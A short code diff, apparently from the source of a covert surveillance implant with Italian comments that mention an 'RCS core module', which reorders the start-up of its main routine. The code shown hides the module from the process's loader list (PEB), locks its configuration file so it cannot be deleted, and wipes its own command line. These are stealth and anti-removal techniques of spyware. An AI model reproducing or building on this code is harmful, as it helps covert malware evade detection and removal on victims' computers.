@@ -2560,20 +2560,18 @@ void __stdcall HM_sMain(void)
 {
 	pid_hide_struct pid_hide;
 
+	//Riempie i campi relativi al nome del file immagine,
+	//file di configurazione, directory di installazione
+	//etc. Va fatta come PRIMA cosa.
+	if (!HM_GuessNames()) 
+		FNC(ExitProcess)(0);
+
 	// Tutte le funzioni di logging sono attive solo
 	// nella versione demo
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
 
 	REPORT_STATUS_LOG("- Checking modules..............");
-	//Riempie i campi relativi al nome del file immagine,
-	//file di configurazione, directory di installazione
-	//etc. Va fatta come PRIMA cosa.
-	if (!HM_GuessNames()) {
-		REPORT_STATUS_LOG("ERROR\r\n    30112 [Cannot locate RCS core module]\r\n"); 
-		ReportExitProcess();
-	}
-	REPORT_STATUS_LOG("OK\r\n"); 
 
 	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
 	LockConfFile();
@@ -2581,6 +2579,8 @@ void __stdcall HM_sMain(void)
 	// Elimina il modulo dalla PEB
 	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
 	HidePEB(GetModuleHandle(H4DLLNAME));
+
+	REPORT_STATUS_LOG("OK\r\n"); 
 
 	// Cancella la command line
 	HM_ClearCommand();
